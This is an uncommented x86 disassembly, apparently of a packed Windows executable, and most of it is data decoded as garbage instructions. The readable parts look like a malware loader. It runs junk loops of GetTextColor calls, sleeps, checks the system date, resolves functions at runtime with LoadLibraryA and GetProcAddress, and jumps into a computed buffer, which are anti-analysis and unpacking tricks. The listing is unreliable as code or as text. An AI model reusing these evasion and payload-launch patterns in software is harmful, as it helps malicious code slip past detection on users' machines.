push cs
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x1d
jb r-xdata
imul ebp [ edi + 0x24890a00 ] 0x1d
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
add bh [ ebx - 0x4df55891 ]
imul esp [ edi - 0x50947b16 ] 0x24890a00
sbb eax 0x2267bb1d
sbb eax 0xee0bceb5
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x2bbc7272
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x676fea97
jb r-xdata
0xe21e8761 0x23e1
jb r-xdata
jb r-xdata
dec edi
jb r-xdata
mov cl 0xa5
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
inc esi
or eax [ ebp + 0x1c ]
sbb eax 0x7272721d
in eax dx
sbb eax 0x56af6f1d
outsd
jb r-xdata
jb r-xdata
imul esp [ edx + ecx ] 0x1d1d1f3a
mov ebx 0x66ed2267
jmp r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
push edx
mov ch 0x6b
outsd
cmpsb [ esi ] [ edi ]
xor ch ch
push ebp
or ecx [ ecx + 0x721d1d09 ]
jb r-xdata
loop r-xdata
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and ch ch
jb r-xdata
cmp [ 0x55ed721d ] ebx
jb r-xdata
sbb eax 0xf150b1d
dec ebp
jb r-xdata
jb r-xdata
cli
imul esp [ edx + edi * 4 + 0x1d27b10a ] 0x1d
mov ch [ 0xffffffffb50cda09 ]
imul esp [ esi + edi * 4 + 0x1d27a70a ] 0x1d
mov ch [ edi ]
xchg esi eax
and al 0xb5
imul esp [ esi + ebp * 2 - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov dh 0x52
popad
sbb ah bl
sub esp [ ecx ]
sbb ah bl
jb r-xdata
sbb eax 0xe31a611d
in al 0xe3
loop r-xdata
mov edi 0xea60a0e
sbb eax 0xee26611d
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
add [ edx ] cl
mov [ ebx + 0x2267bb1d ] esp
jb r-xdata
pop ss
jb r-xdata
adc bl [ 0x7272721d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1e0a676f 0x1d1d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
xor [ ecx ] ebx
popad
and al 0xea
mov al [ 0x41f7be6a ]
or edx [ esp + ebx * 2 ]
sbb eax 0x7272721d
jb r-xdata
mov ah 0xda
imul edi [ edx ] 0x1d285f0b
sbb eax 0x72727272
jb r-xdata
imul esp [ 0xfffffffff6a76b84 ] 0x1d1b370b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
movsb [ edi ] [ esi ]
into
or ch al
sbb al 0x1d
sbb eax 0xc3df028a
sbb eax 0x6b0aea97
add [ 0xbbbbb1d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ ebx + 0x1 ]
sbb eax 0xbbbbb1d
pop ebp
shl [ edx ] 0x1
or eax [ eax + 0x721d1d1d ]
jb r-xdata
or eax [ ecx + ecx * 8 - 0x1e ]
loop r-xdata
mov dl 0xb2
mov dl 0xb1
jb r-xdata
jb r-xdata
mov edx 0xe2f8900b
loop r-xdata
mov [ ebp + 0x6a76b84 ] dl
jb r-xdata
sbb eax 0xd055ed72
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ ebx - 0x1ee2e2c9 ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x16bf6b02
test cl bl
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
0x7272212b 0x7272
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x13c20bee ] al
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbc0bea97
pop ss
sbb eax 0x7272721d
0x1d016b0a 0xbb1d
jb r-xdata
mov edi 0xec7e0bca
jb r-xdata
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb
mov esp ebp
loop r-xdata
sbb eax 0x9c19ad8a
out dx eax
mov ch 0x6b
add bl [ 0xffffffff9ea46b1d ]
jb r-xdata
sbb [ 0xfffffffffd9267ed ] ebx
loop r-xdata
push es
sbb eax 0xee26611d
imul ebx [ esi + 0xab4f6c6 ] 0xffffff90
mov bl [ 0xffffffffb1e2e2e2 ]
mov ah 0xa
daa
push ds
jb r-xdata
in eax dx
jb r-xdata
sbb eax 0x69caac69
mov edi 0x6930bee
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0x74d0b1d
aas
jb r-xdata
jb r-xdata
popad
jb r-xdata
imul ebp [ edi - 0x589044fe ] 0xa
mov dl 0x69
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbf6b0697
jb r-xdata
sbb eax 0x72727272
and [ 0x7272721d ] ebx
xor [ edi ] 0x1d
push ds
jb r-xdata
in eax dx
call sub_45bcd8
loop r-xdata
or dh bl
sub bl [ 0x2267bb1d ]
and ch ch
loop r-xdata
jb r-xdata
jb r-xdata
adc bl [ ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x88
jecxz r-xdata
sbb eax 0xe188b5b5
loop r-xdata
or ch [ 0xb1d1d1f ]
push edi
dec edx
and edx 0xffffffe2
and eax 0x7afac6a6
fsub st2
loop r-xdata
or edi [ esi - 0x14 ]
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0xe2e26274
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0x6b
push 0x52
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
or edx [ ebx + 0x721d1d06 ]
jb r-xdata
push ss
aaa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
loop r-xdata
or cl [ ebp + 0x52 ]
jb r-xdata
sbb eax 0xb22e11d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
les ecx [ ebp + 0x1d ]
lea bx [ edi ]
aas
jb r-xdata
sbb eax 0x89f0bcf
sbb eax 0xd2a66f1d
sbb eax 0xb2f6971d
sbb eax 0xe2e20e75
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
sbb eax 0x2267bb1d
in eax dx
jmp r-xdata
and al 0xa
cmp bl [ edi ]
stc
loope r-xdata
imul edi [ edi + 0x69818818 ] 0x38
or ebp [ ebx ]
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
push es
jb r-xdata
sbb eax 0x160b22e1
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
or edi edi
jb r-xdata
xchg edi eax
add bl [ 0xffffffffe2e26675 ]
loop r-xdata
sbb eax 0xed22671d
or ecx [ ebp + 0x7 ]
jb r-xdata
push edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg cx ax
adc ebx [ 0xa7e0b1d ]
sbb eax 0x7272721d
jb r-xdata
sbb [ 0xffffffffa76f721d ] bl
sbb eax 0x900bb294
jb r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
sbb eax 0x1d074d0b
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
imul ebp [ ebx + 0x16afe11a ] 0x1d244b0b
sbb eax 0xb727272
xchg ebx eax
out 0xe2 al
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul edi [ esi - 0x267b162e ] 0x33
or ebx [ ebx + 0x58 ]
sbb eax 0xcaac691d
and ch [ ebx ]
jb r-xdata
test [ ebx - 0x49 ] ch
cmp cl [ ebx ]
dec esi
sbb eax 0x7272721d
or ebx [ ebx ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
sbb eax 0x2b22d172
jb r-xdata
and cl [ ebx ]
jb r-xdata
loope r-xdata
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x49 ] ch
cmp [ eax + 0x6b849288 ] bh
push esp
loop r-xdata
push ss
mov dl 0xb
imul ebp [ edx ] 0x1d
sbb eax 0x72727272
or edx [ eax + 0x721d1d18 ]
outsd
jb r-xdata
jb r-xdata
pop ss
jb r-xdata
jb r-xdata
sbb eax 0x751d0297
pop es
jb r-xdata
jb r-xdata
imul esp [ 0x7221bfbd ] 0x72727272
jb r-xdata
jb r-xdata
imul ebp [ edx ] 0x1d1cbf0b
sbb eax 0x72727272
jb r-xdata
mov [ esp + eax * 4 - 0x47434895 ] cl
mov [ esi + 0x1d0a380b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
dec ebp
jb r-xdata
push edi
or [ 0x7272721d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ 0xffffffff8c66ed1d ] ebx
imul ebp [ edi + 0x364d0b2e ] 0x1d
sbb eax 0x72727272
mov [ 0x1d2f690b ] al
sbb eax 0x72727272
sbb eax 0x1d0a7272
daa
sbb eax 0x22d1bb1d
imul esi [ edi - 0x6d7747c8 ] 0xffffff84
imul esi [ edi + 0x510bb83e ] 0x4e
sbb eax 0x7272721d
jb r-xdata
dec esi
jb r-xdata
push esi
sbb eax 0xa72721d
jb r-xdata
out dx al
xor al 0x3b
sbb eax 0xe024611d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0x1d0bb11d
or edx [ esi ]
jb r-xdata
mov bh 0x3e
mov eax 0x1d4e510b
mov eax 0x6b849288
scasb [ di ]
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
imul esp [ edi + 0x2eafe136 ] 0x526a6bb2
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edx [ 0x721d1d0f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ edi + edx * 2 ]
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
nop
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
leave
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx esp
popad
mov ebx 0xb2267bb
in eax dx
jb r-xdata
popad
xor bl [ 0x7272721d ]
jb r-xdata
inc edx
stosb [ edi ]
0xa20b2569 0x1d50
test [ ebx - 0x51 ] ch
or ecx [ cs : ebp + 0x36 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov eax 0x1d4e510b
loop r-xdata
out dx al
sbb al 0xb
dec edi
add [ 0x7272721d ] bl
jb r-xdata
or edx [ eax ]
push es
and [ bp + 0x1d ] eax
sbb eax 0x1d23fa0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmp [ edi - 0x59 ] ebp
imul esp [ 0x1d50a20b ] 0x7272721d
jb r-xdata
jb r-xdata
aam 0x3e
jb r-xdata
loope r-xdata
fstp [ edi + 0x6930bee ]
out dx eax
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jb r-xdata
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov bl 0xb
xlat
call 0xffffffffdc5199cd
xor al 0x1d
jb r-xdata
or ebp esi
mov ch 0xce
or cl [ ecx - 0x44e2e2dc ]
and ch ch
imul edi [ edi + 0x16bf6b02 ] 0xffffff84
fldenv [ esp + 0x17fa61ed ]
jb r-xdata
sbb eax 0xa76f721d
in eax dx
bound esi [ ecx + 0x1d25cb0b ]
sbb eax 0x4acb66ed
sbb eax 0x5aaf6f1d
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh ah
cmp [ 0xffffffffed22671d ] bl
hlt
sar [ ecx ] 0x1
outsd
cmpsd [ esi ] [ edi ]
and ch ch
jb r-xdata
or esi [ ecx + ecx ]
jb r-xdata
or ecx [ ebx + 0x24 ]
sbb eax 0x7272721d
or edx [ ebx + 0x72e2e2e6 ]
imul edi [ 0x24611931 ] 0xbe6aa0ea
test [ ecx + 0xb ] 0x1d1d5c14
jb r-xdata
salc
loop r-xdata
push ds
cmp ebx [ 0xffffffffe024611d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jno r-xdata
jb r-xdata
pop edx
sbb eax 0x4c710a1d
jb r-xdata
jb r-xdata
mov [ ecx + 0x6b843b69 ] dl
imul edi [ eax ] 0x42bf6b84
jb r-xdata
sbb eax 0xbe02461
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub ebx [ eax + 0x1d ]
sbb eax 0x66ed2267
cli
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
or ecx [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
fcmovnbe st6
jb r-xdata
inc eax
imul edi [ eax ] 0x46bf6b84
mov ecx 0x6b849688
imul ebp [ edx + 0xb2569ea ] 0x1d1d50a2
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0x17ff0b1d
cli
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2bbbbb1d
and [ edx + 0x72 ] esi
sub al 0x57
jpe r-xdata
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x54ae2c2 ] 0xffffffb5
xchg edi eax
sbb eax 0x6971d72
mov edx 0x1d34dc0b
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov ah dl
0x4a0be2e2 0x1d3b
or [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov eax eax
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1aa7db
outsb
jo r-xdata
sbb eax 0xed22671d
jb r-xdata
cmp ebx [ bx + si + 0x1d ]
sbb eax 0x722122d1
jb r-xdata
loop r-xdata
sbb eax 0x1d4c710a
sbb eax 0x67ed2267
out dx eax
das
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb1d1d27
shl [ edx ] 0x1
loop r-xdata
sbb eax 0xed22671d
and al 0xe0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
scasb [ edi ]
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
sbb eax 0x7272721d
cmpsd [ esi ] [ edi ]
sbb dh [ edx + 0xc0a2469 ]
pop ebp
sbb eax 0x2267bb1d
jb r-xdata
loopne r-xdata
xchg edx eax
sbb eax 0x8590b1d
sbb eax 0x2267721d
or esp edx
add [ 0xffffffffee0ab51d ] ebx
and ebx [ 0x67bbbb1d ]
and cl [ ebx ]
sbb eax 0x1d35170b
sbb [ ecx + 0x1d ] ecx
mov dl al
in eax dx
mov edi 0x9188b944
test [ ebx - 0x41 ] ch
dec edx
mov ecx 0x48bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x1d
sbb eax 0x8a727272
fsubp st0
sar [ edx + 0x1d34dc0b ] 0x1d
or edx edi
jb r-xdata
sub cl [ ebx ]
sub eax 0x2a691d1d
or edi [ edi + 0x721d1d1c ]
adc [ ecx ] eax
sbb eax 0x8c66ed1d
jb r-xdata
out dx al
loopne r-xdata
mov edi 0x84386940
imul edi [ edi - 0x697746ba ] 0xffffff84
imul edi [ edi - 0x6e7746bc ] 0xffffff84
imul edi [ edi + 0x6b84b94a ] 0xffffffbf
dec eax
jb r-xdata
push es
fdiv [ ebx - 0x68e28de3 ]
jb r-xdata
jb r-xdata
out dx eax
jb r-xdata
sbb eax 0x8a727272
jb r-xdata
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push rw-data
push ebp
jb r-xdata
clc
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
add [ eax ] al
jb r-xdata
jb r-xdata
sbb eax 0xb11dd11d
or esp [ eax + 0x28 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ch [ eax + 0xb1d1d13 ]
or [ esi ] eax
sbb [ bx + di + 0x1d ] ecx
cli
in eax dx
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ecx 0x6b849188
mov edi 0x6b84b94a
mov edi 0x6100b48
add eax 0xaf691d1d
0x1f1a676f 0x1d1d
or bh dl
imul edi [ edi - 0x7bc796c0 ] 0x6b
mov edi 0x9688b946
test [ ebx - 0x41 ] ch
inc esp
jb r-xdata
jb r-xdata
xchg ebx eax
jb r-xdata
sbb eax 0x1d3f7a0b
sbb eax 0x72727272
mov dl 0x6f
sbb eax 0x971d721d
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xb48c3ea7
scasd [ edi ]
scasd [ edi ]
or dh ch
add ebx [ 0xffffffffb9bcbd1d ]
and ch ch
in al 0x26
sbb eax 0x36af6f1d
outsd
cmpsd [ esi ] [ edi ]
or ecx [ es : esi + 0x27 ]
sbb eax 0xb41d721d
fisubr [ ecx + 0x3a ]
or ebx [ edi + 0x28 ]
sbb ebx [ 0x7272721d ]
jb r-xdata
xchg edx eax
mov ebp 0x25699088
test [ ebx - 0x59 ] ch
test [ ebx ] 0x37
jb r-xdata
jb r-xdata
nop
nop
push 0x0
in al dx
jb r-xdata
retn
jb r-xdata
popad
and al ah
test [ edi + 0x22 ] ah
in eax dx
xor ax 0x1d06
sbb eax 0x84e055ed
jb r-xdata
or esp [ ecx + 0x32 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
and ebx [ 0x7272721d ]
jb r-xdata
out dx eax
loop r-xdata
push es
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
jb r-xdata
pop ebp
jb r-xdata
push ebp
imul ecx [ esi ] 0x69f60e61
adc ah dl
loop r-xdata
imul edi [ edx ] 0x32a76b84
or ecx [ edx + eax + 0x72721d1d ]
jb r-xdata
add [ eax + 0x1d ] cl
sbb eax 0x84bb3c69
imul edi [ edi - 0x7bc596aa ] 0x6b
cmpsd [ esi ] [ edi ]
xor cl [ ebx ]
mov [ edx ] es
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xfa
0x1d22 0xb1d
and ch ch
mov [ fs : eax ] esp
add [ ebx ] dh
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
jb r-xdata
sbb eax 0x72727272
mov ch dl
loopne r-xdata
or ebx [ edi + 0x6f1d1d08 ]
cmpsb [ esi ] [ edi ]
sar dl cl
jb r-xdata
iretd
jb r-xdata
test bl bl
jb r-xdata
jb r-xdata
loop r-xdata
and [ 0x7272721d ] ebx
jb r-xdata
mov ebx 0x920b2267
loop r-xdata
mov [ rw-data ] 0x70ec
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
push 0x0
call GetTextColor
jmp r-xdata
jae r-xdata
or cl [ ebx * 2 + 0x67bb1d1d ]
and ch ch
in eax 0x5d
retn 0x4
in eax dx
mov cl 0xb5
or esi [ esi + 0xb1d1d5b ]
adc [ eax + 0x1d ] ebx
mov ebx 0xba222d1
imul ebp [ edi ] 0x72721d1d
jb r-xdata
sbb edx [ esi + 0x1d ]
cmpsd [ esi ] [ edi ]
push ss
or edx [ ebp + 0x58 ]
sbb eax 0xdb72721d
cdq
fsubp st5
les ecx [ di + 0x1d ]
outsd
mov esp 0xbfbd2569
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x72727272
rcl [ ebp + 0x68 ] 0x72
jb r-xdata
mov ebp esp
jb r-xdata
cli
or [ 0xffffffffd2a66f1d ] bl
mov cl 0x1d
mov ah 0xde
or esp edi
lahf
jb r-xdata
salc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
mov ah 0xa
test al 0x13
sbb eax 0x6090b1d
or cl [ eax ]
inc esp
sbb eax 0xee26611d
loop r-xdata
mov [ rw-data ] 0x5b8b
nop
mov [ rw-data ] 0x1
or edx [ ecx + 0x4e ]
jb r-xdata
push r-xdata
jb r-xdata
jb r-xdata
xor ch [ edi + 0x67 ]
bound ebx [ edi ]
jb r-xdata
sbb eax 0x6772721d
and cl [ ebx ]
sbb eax 0x721d1d4e
jb r-xdata
sbb eax 0xbb6d008a
mov edx 0x4a130bb5
adc [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0xe70bdeb4
scasw [ edi ]
loop r-xdata
nop
nop
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x1a99
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sbb eax 0xbb5fab5
jb r-xdata
in eax 0x45
jb r-xdata
xor eax eax
jb r-xdata
bound ebx [ bx ]
jb r-xdata
mov [ rw-data ] 0x3177
nop
push 0x0
call GetTextColor
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
push ebp
jb r-xdata
pop ds
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x8a0c
jne r-xdata
nop
push 0x0
call GetTextColor
nop
nop
mov eax 0x1fd3a51b
call sub_4026bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
sbb eax 0x441d0bb1
jb r-xdata
mov [ rw-data ] 0x1
jb r-xdata
mov ah 0xe2
inc ebp
add bl al
jmp r-xdata
inc ebp
jb r-xdata
or ebx [ 0x721d1d44 ]
jb r-xdata
jb r-xdata
mov ecx 0x8e
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403174
jae r-xdata
and [ ebx + 0x461bd82d ] al
jb r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
push [ fs : eax ]
jb r-xdata
mov edi 0x721d1d1c
sbb eax 0xb2a691d
jb r-xdata
inc esp
jb r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_40316c
sub eax rw-data
jb r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
shl [ edx ] 0x1
mov [ 0x1d08ee0b ] al
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1fd39246
jne r-xdata
call sub_403174
add [ edi ] ecx
sbb eax [ esi ]
jb r-xdata
mov [ eax ] esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ah [ edx + 0x1d08ee0b ]
mov [ ebx + ebp * 2 - 0x77474349 ] es
xchg [ ebx ] cl
jb r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
add [ ecx ] al
jb r-xdata
jb r-xdata
cmp [ edx ] cl
sbb eax 0x7272721d
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x89ed
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
nop
jb r-xdata
fcomp [ ebx ]
jb r-xdata
inc ebp
and al 0x85
lodsb [ esi ]
or ah [ edi + 0x11 ]
sbb eax 0x51350b1d
sbb eax 0x7272721d
mov esp 0x1d51740b
sbb eax 0x9f6b1d88
sbb cl [ ebx ]
lea ecx [ edi ]
sbb eax 0xb0b5b41d
pop esp
nop
nop
push 0x12
call Sleep
nop
cmp [ rw-data ] 0x2
jbe r-xdata
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
test [ edx ] al
jb r-xdata
inc esi
jb r-xdata
nop
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_458470
mov [ rw-data ] eax
cmp [ rw-data ] 0x15
jbe r-xdata
nop
push 0x0
call sub_4584f0
nop
nop
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
call sub_403174
add [ eax ] al
jb r-xdata
jb r-xdata
imul esp [ esi + edx * 4 + 0x1d22b90a ] 0x1d
mov al [ ebx ]
loopne r-xdata
add [ edx + eax - 0x1b980000 ] 0x1b
inc esi
add al ch
retn 0xfa7c
jb r-xdata
mov [ eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push ebx
or esp [ ebx + 0x721d1d0e ]
jb r-xdata
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
add al [ eax ]
jb r-xdata
imul eax [ edx ] 0x0
add [ eax - 0x17ff9570 ] dl
cli
jle r-xdata
jb r-xdata
add [ eax - 0x1c ] ch
sbb eax [ esi ]
jb r-xdata
push 0x0
call GetTextColor
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleWindowExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
je r-xdata
[ edx ]
movsb [ edi ] [ esi ]
xchg esi eax
or bh [ ecx - 0x75e2e2de ]
add esp eax
and eax 0xea30b53
sub_44c003
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax ] al
je r-xdata
dec [ edx + ebp * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
jmp [ edx + ebp * 8 + 0x44 ]
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
call [ edx + ebp * 8 - 0x1557ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
dec [ eax ]
0x10044 0x0
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ eax - 0x33ffbc4a ] bh
xor [ eax ] eax
call 0x584501c6
in eax dx
inc esp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + eax * 8 ] al
inc esp
add [ eax ] cl
ja r-xdata
inc esp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ edi + ebp * 4 ] dh
inc ebx
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x722c0043 ] dh
inc ebx
add [ eax + 0x75 ] al
inc ebx
add ah ch
jae r-xdata
add [ eax - 0x1bffbc52 ] al
cmp eax 0x94140041
inc ebx
add [ eax ] ch
push 0x9b340043
out 0x43 al
dec esi
outsd
jb r-xdata
add [ ecx + edi * 4 ] ah
inc ebx
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add al al
fiadd [ ebx ]
add al 0xee
inc esp
add [ eax + esi * 8 - 0xd17ffbc ] dh
inc esp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
inc ebx
add [ ebp + esi * 4 + 0x43 ] dl
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
